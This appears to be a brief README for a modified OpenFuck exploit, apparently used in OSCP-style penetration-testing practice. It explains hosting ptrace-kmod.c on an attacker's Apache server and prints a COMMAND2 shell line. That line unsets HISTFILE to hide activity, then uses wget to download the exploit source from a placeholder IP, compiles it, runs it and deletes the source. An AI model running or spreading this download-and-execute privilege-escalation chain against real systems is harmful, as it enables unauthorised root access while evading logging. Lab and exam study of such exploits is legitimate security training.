# openfuck_oscp

## modified the code on line 671


## download ptrace-kmod.c from https://packetstormsecurity.com/files/download/30973/ptrace-kmod.c 


## host  ptrace-kmod.c in apache server and replace the url with apache  

## added the lines export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin to overcome ld error

## enter url of the file in the command2


## change the url only to execute the code
```
#define COMMAND2 "unset HISTFILE; cd /tmp;export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin; wget http://enter ur ip here/ptrace-kmod.c; gcc -o exploit ptrace-kmod.c; rm ptrace-kmod.c; ./exploit; \n"
```
# for more refer:https://medium.com/@snowshoe/how-to-compile-openfuckv2-c-69e457b4a1d1


